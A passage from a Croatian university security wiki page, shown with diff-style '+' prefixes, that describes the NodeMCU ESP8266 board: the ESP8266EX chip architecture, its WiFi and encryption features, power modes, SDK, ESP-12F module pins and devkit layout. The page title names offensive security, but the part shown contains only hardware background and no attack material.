+<ul><li>GPIO (<i>General-purpose input/output</i>) - predstavlja slobodno ulazno-izlazno sučelje čiju namijenu određuje korisnik<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[4]</a></sup>,
+</li><li>PWM (<i>Pulse-width modulation</i>) - kodiranje poruke ili upravljanje nekim perifernim uređajem izmjenom frekvencije signala<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[4]</a></sup>,
+</li><li>ADC (<i>Analog-to-digital converter</i>) - uređaj za pretvorbu analognih signala u digitalne pomoću uzorkovanja
+</li></ul>
+<p>dok single-board MPU računala uglavnom imaju samo GPIO. S druge strane, single-board MPU računala uglavnom dolaze opremljena sa ethernet prikljucima i WiFi modulima<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[4]</a></sup>.
+</p>
+<h3> <span class="mw-headline" id="ESP8266.2C_MCU_ili_MPU.3F"> ESP8266, MCU ili MPU?</span></h3>
+<p>Uzevši u obzir sve razlike i karakteristike MCU i MPU pločica, NodeMCU ESP8266 pločicu možemo svrstati u mikrokontrolerske pločice, no, bitno je napomenuti da postoji nekoliko karakteristika koje ovu pločicu čine posebnom. 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07813.JPG" class="image"><img alt="" src="../images/thumb/2/2c/DSC07813.JPG/800px-DSC07813.JPG" width="800" height="533" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07813.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 6.</b> NodeMCU ESP8266 (medo for scale)</div></div></div></div>
+<p>Prije svega, to su:
+</p>
+<ul><li><b>posjedovanje modula za bežičnu komunikaciju po 802.11 (WiFi)</b>
+</li><li><b>mogućnost korištenja skriptnih jezika poput Lue, MicroPython-a i JavaScripta u pisanju pogonskih programa</b>
+</li><li><b>mogućnost korištenja programskih jezika u pisanju pogonskih programa, puput C/C++ i BASICA</b>
+</li><li><b>mogućnost instalacije specijaliziranih operacijskih sustava poput <a href="https://mongoose-iot.com/" class="external text" rel="nofollow">Mongoose OS-a</a></b>
+</li><li><b>vanjska SPI flash memorija do 16 MB</b>
+</li></ul>
+<p>Stoga, možemo zaključiti da je ESP8266 pločica ima neke osobine mikroprocesorskih pločica, što u svakom slučaju olakšava rad sa ovom mikrokontrolerskom pločicom te je čini lakše povezivom sa ostalom okolinom. U nastavku ćemo detaljnije proučiti arhitekturu same pločice, pa će nam biti jasnije što se zapravo skriva iza kodnog imena.
+</p>
+<h3> <span class="mw-headline" id="NodeMCU.3F_ESP12E.3F_ESP8266.3F_SoC.3F_DEVKIT_v2.3F"> NodeMCU? ESP12E? ESP8266? SoC? DEVKIT v2? </span></h3>
+<p>Trenutno na tržištu postoje razne inačice pločica sa ESP8266 čipom, pa zbog toga često dolazi do zabune pri raspoznavanju. Štoviše, određene pločice sadrže dodatne mogućnosti, pa stoga imaju i drugačije nazive, a osim toga, <b>često se na tržištu cijela pločica naziva imenom samog čipa</b>, što je zapravo krivo. U ovom dijelu pokušat ćemo pojasniti na što se odnose koji dijelovi naziva u konkretnoj pločici na kojoj radimo - NodeMCU ESP8266 ESP-12E DEVKIT v2.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07862.JPG" class="image"><img alt="" src="../images/thumb/f/f7/DSC07862.JPG/900px-DSC07862.JPG" width="900" height="566" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07862.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 7.</b> Pojašnjenje nazivlja u NodeMCU ESP8266 ESP-12E DEVKIT v2</div></div></div></div>
+<h4> <span class="mw-headline" id="ESP8266_.28ESP8266EX.29_SoC"> ESP8266 (ESP8266EX) SoC </span></h4>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266ex.jpg" class="image"><img alt="" src="../images/thumb/5/5f/Esp8266ex.jpg/180px-Esp8266ex.jpg" width="180" height="180" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266ex.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 8.</b> ESP8266EX (Izvor: <a href="https://shop.edwinrobotics.com/1680-thickbox_default/esp8266ex-tiny-wireless-80211-bgn-chip.jpg" class="external free" rel="nofollow">https://shop.edwinrobotics.com/1680-thickbox_default/esp8266ex-tiny-wireless-80211-bgn-chip.jpg</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-HD.jpg" class="image"><img alt="" src="../images/thumb/e/e0/ESP8266-HD.jpg/180px-ESP8266-HD.jpg" width="180" height="190" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-HD.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 9.</b> ESP8266EX pod elektronskim mikroskopom (Izvor: <a href="https://github.com/esp8266/esp8266-wiki/wiki/chip-internals" class="external free" rel="nofollow">https://github.com/esp8266/esp8266-wiki/wiki/chip-internals</a>)</div></div></div>
+<p>Kako je vidljivo na slici 7., oznaka ESP8266, tj. ESP8266EX, odnosi se zapravo na ESP8266EX WiFi SoC (sustav na čipu - izraz koji se koristi za čip, ili pločicu, koja sadrži sve komponente osnovnog računala<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[5]</a></sup>, a u ovom slučaju, specijalno sadrži i mogućnosti umrežavanja putem bežične mreže - WiFi) kineskog proizvođača <a href="https://espressif.com/en/" class="external text" rel="nofollow">Espriff</a>, a odlikuje ga kompaktnost, visoka integriranosti, performanse i mala potrošnja, a velika posebnost je potpuna integracija WiFi tehnologije. Prema naputku proizvođača, ESP8266EX moguće je koristiti zasebno ili kao WiFi komponentu mikrokontrolera. S tim u vezi, u ESP8266EX ima integriranu antenu, RF sinkronizator (balun), pojačalo napajanja, pojačalo signala, filtere i ostale module za napajanje<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a></sup>.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-BDG.png" class="image"><img alt="" src="../images/thumb/a/ad/ESP8266-BDG.png/800px-ESP8266-BDG.png" width="800" height="386" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-BDG.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 10.</b> ESP8266EX - funkcionalni blok dijagram  (Izvor: <a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a>)</div></div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xtensa8.png" class="image"><img alt="" src="../images/thumb/6/69/Xtensa8.png/180px-Xtensa8.png" width="180" height="132" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xtensa8.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 11.</b> Xtensa 8 arhitektura - blok dijagram (Izvor: <a href="http://caxapa.ru/thumbs/310849/Tensilica-LX3_Reprint.pdf" class="external free" rel="nofollow">http://caxapa.ru/thumbs/310849/Tensilica-LX3_Reprint.pdf</a>)</div></div></div>
+<p>Osim toga, ESP8266EX ima integrirani mikrokontroler i mikroprocesor, koji su objedinjeni u Tensilica L106 (32-bit MCU/16-bit RISC) procesoru familije Xtensa 8 (<a href="https://www.youtube.com/watch?v=rwq-Go44Y5U" class="external text" rel="nofollow">Need to Offload Your Apps Processor? See How Customizable Processors Can Help</a>, <a href="https://www.youtube.com/watch?v=5rnQyoTLVvY" class="external text" rel="nofollow">What's a Configurable Processor?</a>, <a href="https://ip.cadence.com/news/243/330/Tensilica-Unveils-Diamond-Standard-106Micro-Processor-Smallest-Licensable-32-bit-Core.htm" class="external text" rel="nofollow">Tensilica Unveils Diamond Standard 106Micro Processor; Smallest Licensable 32-bit Core</a>), čiji takt  iznosi 80-160 MHz. Ujedno se na samom čipu nalazi i SRAM memorija (static random access memory - momorija koja zadržava stanje sve dok je pod naponom, brža je od konvencionalnog DRAMA koji se koristi kao glavna memorija računala, pa se zato koristi kao cache memorija u procesorima<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[7]</a></sup>). Količina RAM memorije za korisnika iznosi 50kB, dok perzistentna memorija (ROM) za korisničke programe ne postoji, već je potrebna vanjska SPI flash memorija. ESP8266EX podržava do 16MB za korisničke programe. Konačno, ESP8266EX može komunicirati sa vanjskim uređajima i perifernik komponentama putem GPIO, PWM, ADC, SPI (<a href="https://www.arduino.cc/en/reference/SPI" class="external text" rel="nofollow">Serial Peripheral Interface</a>) / <a href="https://en.wikipedia.org/wiki/Secure_Digital#SDIO" class="external text" rel="nofollow">SDIO</a> ili I2C (<a href="https://en.wikipedia.org/wiki/I%C2%B2C" class="external text" rel="nofollow">Inter-integrated Circuit</a>) / UART (<a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter" class="external text" rel="nofollow">Universal asynchronous receiver/transmitter</a>)<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a> / I2S (<a href="https://en.wikipedia.org/wiki/I%C2%B2S" class="external text" rel="nofollow">Inter-IC Sound</a>) </sup>.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:502px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-pinout.png" class="image"><img alt="" src="../images/thumb/8/8e/ESP8266-pinout.png/500px-ESP8266-pinout.png" width="500" height="502" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266-pinout.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 12.</b> ESP8266EX pregled ulaza/izlaza (Izvor: <a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a>)</div></div></div></div>
+<p><b>Ono što je svakako najvažnija stavka ESP8266EX čipa, kako je već rečeno, jest integrirana WiFi tehnologija. Karakteristike integrirane WiFI tehnologije su sljedeće</b><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a></sup>:
+</p>
+<ul><li> <b>potpuna podrška ta TCP/IP (samo IPV4)</b>
+</li><li> raspon frekvencije: 2.4G ~ 2.5G (2400M ~ 2483.5M)
+</li><li> <b>podrška za 802.11 b/g/n/e/i</b>
+</li><li> antene: zasebne antene za slanje i primanje (<a href="https://en.wikipedia.org/wiki/Antenna_diversity" class="external text" rel="nofollow">antenna diversity</a>), PCB Trace, External, IPEX Connector, Ceramic Chip
+</li><li> podrška za Wi-Fi Direct (P2P) - mogućnost direktnog uprivanja uređaja putem bežične mreže bez potrebe za pristupnom točkom<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[8]</a></sup>
+</li><li> P2P Discovery, P2P GO (Group Owner) mod, GC(Group Client) mod te P2P upravljanje potrošnjom
+</li><li> načini rada:
+<ul><li> <b>infrastrukturni (BSS Station mode)</b>
+</li><li> <b>P2P</b>
+</li><li> <b>SoftAP (softverska pristupna točka)</b>
+</li></ul>
+</li><li><b>hardverska podrška za kriptografske i autentikacijske algoritme</b>:
+<ul><li>CCMP (CBC-MAC, counter mode) - Counter Mode Cipher Block Chaining Message Authentication Code Protocol, Counter Mode CBC-MAC Protocol<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[9]</a></sup>
+</li><li>TKIP (MIC, RC4) - Temporal Key Integrity Protocol<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[10]</a></sup>
+</li><li>WAPI (SMS4) - WLAN Authentication and Privacy Infrastructure<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[11]</a></sup>
+</li><li>WEP (RC4) - Wired Equivalent Privacy<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[12]</a></sup>
+</li><li>CRC - Cyclic redundancy check<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[13]</a></sup>
+</li></ul>
+</li><li>podrška za WPA/WPA2 PSK<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[14]</a></sup> (Wi-Fi Protected Access) i WPS (Wi-Fi Protected Setup)<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[15]</a></sup>
+</li><li>sučelje za korištenje različitih EAP(Extensible Authentication Protocol) autentikacijskih shema višeg sloja, poput npr. TLS, PEAP, LEAP, SIM, AKA ili korisnički specificiranih
+</li><li>podrška za <a href="https://en.wikipedia.org/wiki/MIMO" class="external text" rel="nofollow">MIMO</a> (1x1, 2x1), <a href="https://en.wikipedia.org/wiki/Space%E2%80%93time_block_code" class="external text" rel="nofollow">STBC</a>, <a href="https://en.wikipedia.org/wiki/Frame_aggregation" class="external text" rel="nofollow">A-MPDU, A-MSDU</a>
+</li><li>802.1h/RFC1042 enkapsulacija okvira
+</li><li>standardi: FCC/CE/TELEC/SRRC
+</li></ul>
+<p><br />
+</p><p>Još jedna od važnih karakteristika ESP8266EX-a jest tehnologija upravljanja potrošnjom energije. Ovo je primarno iz razloga što je i sam čip namijenjen mobilnim uređajima i mobilnim SoC-evima, pa je potrebna što manja potrošnja energije. <b>Stoga, u sam čip ugrađeno je nekoliko modova rada (spavanja) dostupnih korisniku</b><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a></sup>:
+</p>
+<ul><li>Modem-sleep - ako nema transmisije podataka, tada je WiFi modem isključen, u ciklusima od 300ms, modem se aktivira kako bi primio beacon okvire od pristupne točke
+</li><li>Light-sleep - ako nema transmisije podataka, tada je isključen WiFi modem, a CPU suspendiran, u ciklusima od 300ms modem se aktivira kako bi primio beacon okvire od pristupne točke
+</li><li>Deep-sleep - isključen WiFi modem, u ciklusima od 300s modem se aktivira kako bi primio beacon okvire od pristupne točke
+</li></ul>
+<p>Na prikazu 12 dan je pregled potrošnje čipa pri različitim modovima rada:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266powerconsumption.png" class="image"><img alt="" src="../images/thumb/8/86/ESP8266powerconsumption.png/800px-ESP8266powerconsumption.png" width="800" height="387" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:ESP8266powerconsumption.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 13.</b> Tipična potrošnja čipa pri različitim modovima rada (Izvor: <a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[6]</a>)</div></div></div></div>
+<p>Što se tiče programiranja ESP8266EX, puno više o tome će biti riječi u kasnijim poglavljima, no, ono što nas trenutno zanima jest kakva je podržanost od strane proizvođača. Espressif, naime, daje službeni SDK (Software Devekopment Kit) u koji nam daje pristup upravljanju sljedećim mogućnostima<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[17]</a></sup>:
+</p>
+<ul><li> tajmer - putem sustavskih API-ja
+</li><li> operacije nad SPI flash memorijom
+</li><li> kontrola WiFi-a
+</li><li> nadogradnja firmware-a
+</li><li> TCP-UDP operacije
+</li><li> API za upravljanje Mesh mrežama
+</li><li> ostali aplikacijski API (poput AT naredbi ili JSON parsiranja)
+</li><li> podatkovne strukture i definicije
+</li><li> upravljanje i komunikacija s perifernim i spojenim uređajima putem GPIO, UART, I2C, PWM i SDIO-a
+</li></ul>
+<p>Više o SDK-u može se naći na <a href="http://espressif.com/en/products/hardware/esp8266ex/resources" class="external free" rel="nofollow">http://espressif.com/en/products/hardware/esp8266ex/resources</a>. Na raspolaganju su također dostupni i neki drugi neslužbeni SDK paketi, no o njima nešto više kasnije.
+</p>
+<h4> <span class="mw-headline" id="ESP8266_moduli_.28ESP-12F.29"> ESP8266 moduli (ESP-12F) </span></h4>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-variants.png" class="image"><img alt="" src="../images/thumb/e/ea/Esp8266-variants.png/180px-Esp8266-variants.png" width="180" height="195" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-variants.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 15.</b> Različiti ESP8266 moduli (Izvor: <a href="http://web-engineering.info/sites/default/files/wot_tutorials/Mongoose-IoT-ESP8266/esp8266-variants.png" class="external free" rel="nofollow">http://web-engineering.info/sites/default/files/wot_tutorials/Mongoose-IoT-ESP8266/esp8266-variants.png</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Shema_spajanja_ESP8266_na_modul.png" class="image"><img alt="" src="../images/thumb/b/bf/Shema_spajanja_ESP8266_na_modul.png/180px-Shema_spajanja_ESP8266_na_modul.png" width="180" height="84" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Shema_spajanja_ESP8266_na_modul.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 16.</b> Shema spajanja ESP8266EX na modul (konkretno ESP-WROOM-02) (Izvor: <a href="http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf" class="external free" rel="nofollow">http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Shemaizlazasamodula.png" class="image"><img alt="" src="../images/thumb/7/7d/Shemaizlazasamodula.png/180px-Shemaizlazasamodula.png" width="180" height="87" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Shemaizlazasamodula.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 17.</b> Shema spajanja perifernih uređaja na modul (konkretno ESP-WROOM-02) (Izvor: <a href="http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf" class="external free" rel="nofollow">http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf</a>)</div></div></div>
+<p>U normalnim okolnostima, netko tko se bavi hobi-elektronikom neće raditi sa samim ESP8266(EX) čipom već će vjerojatno koristiti tzv. <b>ESP8266 modul</b> (modul zapravo u sebi ima integrirani ESP8266EX). Ovo proizlazi iz nekoliko glavnih razloga<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[18]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[19]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[20]</a></sup>:
+</p>
+<ul><li>modul olakšava pristup ulazima/izlazima na ESP8266(EX) čip - pruža pojednostavljen pristup ulazima/izlazima prema ESP8266(EX) pomoću pinova
+</li><li>modul ima ugrađenu SPI flash memoriju (ROM) za pohranu korisničkih programa
+</li><li>modul ima ugrađenu (PCB) WiFi antenu koja znatno proširuje raspon signala
+</li><li>modul regulira frekvenciju rada putem kristalnog oscilatora
+</li></ul>
+<p>Dakako, gornje funkcionalnosti nisu prisutne u svim dostupnim modulima na tržištu, već se moduli razlikuju po istima. Trenutno se na tržištu najčešće mogu naći ESP-12 E/F moduli kineskog proizvođača <a href="http://en.ai-thinker.com/" class="external text" rel="nofollow">Ai-Thinker</a>, dok su ostali moduli istog proizvođača označeni ESP-XY oznakama<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[18]</a></sup>. Pri kupnji modula, tj. razvojne pločice, treba obratiti pažnju koji modul se odabire. Svakako je preporučljivo kupiti modul iz zadnje serije jer uglavnom predstavlja neki oblik nadogradnje ili popravka u odnosu na prethodni modul. Na prikazu 14, dan je općeniti dizajn ESP8266 modula (prema ESP-WROOM-02 tvrtke Espriff). Na prikazu se može uočiti da sam ESP8266(EX) čip dolazi u središte modula.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:602px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Espmodul.png" class="image"><img alt="" src="../images/thumb/3/39/Espmodul.png/600px-Espmodul.png" width="600" height="506" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Espmodul.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 14.</b> Model ESP8266 modula sa ugrađenom PCB antenom (konkretno ESP-WROOM-02) (Izvor: <a href="http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf" class="external free" rel="nofollow">http://espressif.com/sites/default/files/documentation/0c-esp-wroom-02_datasheet_en.pdf</a>)</div></div></div></div>
+<h5> <span class="mw-headline" id="ESP-12F"> ESP-12F </span></h5>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-14_shieldremoved.jpg" class="image"><img alt="" src="../images/thumb/e/ef/Esp8266-14_shieldremoved.jpg/180px-Esp8266-14_shieldremoved.jpg" width="180" height="122" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp8266-14_shieldremoved.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 18.</b> ESP-12 modul bez vanjskog štita (Izvor: <a href="http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family" class="external free" rel="nofollow">http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Schematic_esp-12e.png" class="image"><img alt="" src="../images/thumb/1/1a/Schematic_esp-12e.png/180px-Schematic_esp-12e.png" width="180" height="123" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Schematic_esp-12e.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 20.</b> Shema spajanja ESP8266EX na ESP-12E modul ((Izvor: <a href="http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family" class="external free" rel="nofollow">http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:HTB1d7UgJpXXXXcYXVXXq6xXFXXXn.jpg" class="image"><img alt="" src="../images/thumb/c/c5/HTB1d7UgJpXXXXcYXVXXq6xXFXXXn.jpg/180px-HTB1d7UgJpXXXXcYXVXXq6xXFXXXn.jpg" width="180" height="118" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:HTB1d7UgJpXXXXcYXVXXq6xXFXXXn.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 21.</b> Shema spajanja perifernih uređaja na ESP-12E modul (Izvor: <a href="http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family" class="external free" rel="nofollow">http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family</a>)</div></div></div>
+<p>U ovom radu koristit ćemo ESP-12F modul koji agregira ESP8266EX čip. Pogledajmo koje su glavne karakteristike <b>ESP-12F</b> modula<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[18]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[19]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[20]</a></sup>:
+</p>
+<ul><li>vanjska SPI flash memorija veličine 4MB (3MB SPIFFS - SPI NOR filesystem + 1MB EEPROM - <a href="https://en.wikipedia.org/wiki/EEPROM" class="external text" rel="nofollow">electricaly erasable programmable read-only memory</a>)
+</li><li>PCB antena
+</li><li>kristalni oscilator
+</li><li>11 GPIO pinova (general purpose input/output)
+</li><li>1 RST pin (reset pin - za resetiranje uređaja)
+</li><li>1 CH_PD (EN) pin (chip power down - za kontroliranje načina upravljanja potrošnjom (napajanjem), tj. iskjlučivanjem)
+</li><li>1 VCC (3.3 V) naponski izlaz
+</li><li>1 GND (ground - uzemljenje)
+</li><li>1 ADC (analog-digital converter - za konverziju analognih signala u digitalne)
+</li><li>2 (TXD + RXD) pinova za serijsku komunikaciju
+</li><li>1 CSO
+</li><li>1 MISO
+</li><li>1 MOSI
+</li><li>1 SCLK
+</li></ul>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:555px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:HTB1B13eJpXXXXXLaXXXq6xXFXXXG.jpg" class="image"><img alt="" src="../images/f/fe/HTB1B13eJpXXXXXLaXXXq6xXFXXXG.jpg" width="553" height="440" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:HTB1B13eJpXXXXXLaXXXq6xXFXXXG.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 22.</b> ESP-12F (Izvor: <a href="http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family" class="external free" rel="nofollow">http://www.esp8266.com/wiki/doku.php?id=esp8266-module-family</a>)</div></div></div></div>
+<h4> <span class="mw-headline" id="Razvojna_plo.C4.8Dica_.28NodeMCU_DEVKIT_v2.29"> Razvojna pločica (NodeMCU DEVKIT v2) </span></h4>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:NODEMCU_DEVKIT_V1.0_PINMAP.png" class="image"><img alt="" src="../images/thumb/f/fa/NODEMCU_DEVKIT_V1.0_PINMAP.png/180px-NODEMCU_DEVKIT_V1.0_PINMAP.png" width="180" height="160" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:NODEMCU_DEVKIT_V1.0_PINMAP.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 25.</b> Raspored pinova na NodeMCU DEVKIT v2 (Izvor: <a href="https://github.com/nodemcu/nodemcu-devkit-v1.0" class="external free" rel="nofollow">https://github.com/nodemcu/nodemcu-devkit-v1.0</a>)</div></div></div>
